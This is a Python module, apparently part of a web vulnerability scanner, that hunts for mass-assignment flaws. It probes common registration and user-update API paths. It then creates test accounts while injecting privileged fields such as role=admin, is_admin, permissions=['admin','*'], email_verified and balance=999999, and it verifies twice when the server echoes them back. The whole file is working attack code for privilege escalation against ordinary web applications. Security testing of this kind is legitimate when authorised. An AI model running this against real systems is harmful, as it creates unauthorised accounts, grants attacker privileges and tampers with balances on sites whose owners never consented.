"""mass_assignment v2 — parameter injection with baseline + verify."""
import json
import secrets
from urllib.parse import urlparse
from core.http import HttpClient
from core.verify import confidence, is_signal


# привилегированные поля
PRIV_FIELDS = [
    ("role", "admin"),
    ("roles", ["admin", "user"]),
    ("is_admin", True),
    ("isAdmin", True),
    ("admin", True),
    ("is_superuser", True),
    ("superuser", True),
    ("user_type", "admin"),
    ("type", "admin"),
    ("level", 9999),
    ("permissions", ["admin", "*"]),
    ("group", "administrators"),
    ("verified", True),
    ("is_verified", True),
    ("email_verified", True),
    ("emailVerified", True),
    ("active", True),
    ("is_active", True),
    ("approved", True),
    ("balance", 999999),
    ("credits", 999999),
    ("points", 999999),
    ("premium", True),
    ("subscription", "premium"),
    ("plan", "enterprise"),
]


REGISTER_PATHS = [
    "/api/register", "/api/v1/register", "/api/v2/register",
    "/api/users", "/api/v1/users", "/api/v2/users",
    "/register", "/signup", "/api/signup",
    "/api/account", "/api/account/register",
    "/api/profile", "/api/profile/update",
    "/api/user", "/api/user/update", "/api/user/create",
    "/users", "/user/create",
]


def _make_user_email():
    tok = secrets.token_hex(4)
    return "omni_" + tok, "omni_" + tok + "@example.com"


def _check_reflection(resp_text, field, value):
    if not resp_text:
        return False
    body = resp_text
    body_low = body.lower()
    field_low = field.lower()
    value_low = str(value).lower()

    # 1. JSON parse
    try:
        data = json.loads(body)
        if isinstance(data, dict):
            if field in data:
                return str(data[field]).lower() == value_low or data[field] is True
            for k, v in data.items():
                if isinstance(v, dict) and field in v:
                    return str(v[field]).lower() == value_low or v[field] is True
        if isinstance(data, list) and data and isinstance(data[0], dict):
            if field in data[0]:
                return str(data[0][field]).lower() == value_low or data[0][field] is True
    except Exception:
        pass

    # 2. JSON-style
    needle_json = chr(34) + field_low + chr(34)
    if needle_json in body_low and value_low in body_low:
        idx = body_low.find(needle_json)
        if value_low in body_low[idx: idx + 200]:
            return True

    # 3. HTML/form: role=admin, role: admin, role= admin, role :admin
    for template in (
        field_low + "=" + value_low,
        field_low + ":" + value_low,
        field_low + ": " + value_low,
        field_low + " : " + value_low,
        field_low + "=" + value_low,
        field_low + " = " + value_low,
        field_low + "=&quot;" + value_low,
        field_low + chr(34) + ":" + chr(34) + value_low,
    ):
        if template in body_low:
            return True

    # 4. HTML input hidden
    if field_low in body_low and value_low in body_low:
        idx = body_low.find(field_low)
        context = body_low[idx: idx + 200]
        if value_low in context and ("name" in context or "value" in context):
            return True

    return False


class MassAssignment:
    def run(self, session, logger):
        base = session.target.rstrip("/")
        http = HttpClient(session, logger)

        print("[mass_assignment v2] target: " + base)

        # === Phase 1: discovery ===
        print()
        print("[mass_assignment v2] Phase 1: discovery (" + str(len(REGISTER_PATHS)) + " paths)")
        live_paths = []
        for path in REGISTER_PATHS:
            url = base + path
            try:
                r = http.get(url, allow_redirects=False)
            except Exception:
                continue
            if not r:
                continue
            if r.status_code in (404, 410):
                continue
            if r.status_code in (405,):
                # метод не тот — но endpoint есть, попробуем POST
                live_paths.append(path)
                print("  live (405): " + path)
                continue
            live_paths.append(path)
            print("  live: " + path + " (" + str(r.status_code) + ")")

        if not live_paths:
            print("[mass_assignment v2] no register/update endpoints — skip")
            return {"findings": []}

        findings = []

        # === Phase 2: baseline POST ===
        for path in live_paths:
            url = base + path
            username, email = _make_user_email()

            baseline_body = {
                "username": username,
                "email": email,
                "password": "OmniTest123!",
            }

            try:
                base_r = http.post(url, json=baseline_body,
                                   headers={"Content-Type": "application/json"},
                                   allow_redirects=False)
            except Exception:
                continue
            if not base_r:
                continue

            base_status = base_r.status_code
            base_text = base_r.text or ""

            # baseline должен быть успешным, чтобы можно было сравнивать
            if base_status not in (200, 201, 202):
                print("  " + path + ": baseline status " + str(base_status) + " — skip")
                continue

            print()
            print("[mass_assignment v2] Phase 2: " + path + " baseline=" + str(base_status))

            for field, value in PRIV_FIELDS:
                # избегаем дублей с baseline
                if field in baseline_body:
                    continue

                username, email = _make_user_email()
                test_body = {
                    "username": username,
                    "email": email,
                    "password": "OmniTest123!",
                    field: value,
                }

                try:
                    r = http.post(url, json=test_body,
                                  headers={"Content-Type": "application/json"},
                                  allow_redirects=False)
                except Exception:
                    continue
                if not r:
                    continue
                if r.status_code not in (200, 201, 202):
                    continue

                # сигнал: поле с привилегированным значением отражено в ответе
                if not _check_reflection(r.text or "", field, value):
                    continue

                # verify ×2
                username2, email2 = _make_user_email()
                test_body2 = {
                    "username": username2,
                    "email": email2,
                    "password": "OmniTest123!",
                    field: value,
                }
                try:
                    r2 = http.post(url, json=test_body2,
                                   headers={"Content-Type": "application/json"},
                                   allow_redirects=False)
                except Exception:
                    continue
                if not r2 or r2.status_code not in (200, 201, 202):
                    continue
                if not _check_reflection(r2.text or "", field, value):
                    continue

                conf = confidence(0.9, 1.0)
                if not is_signal(conf, floor=0.55, module="mass_assignment"):
                    continue

                findings.append({
                    "type": "mass_assignment",
                    "severity": "high",
                    "path": path,
                    "field": field,
                    "value": value,
                    "verify_hits": 2,
                    "confidence": conf,
                })
                print("  MASS_ASSIGN: " + path + " accepts " + field + "=" + str(value)[:40])
                logger.finding("mass_assignment", "high", path + " " + field)
                break

        print()
        print("[mass_assignment v2] findings: " + str(len(findings)))
        return {"findings": findings, "live_paths": live_paths}
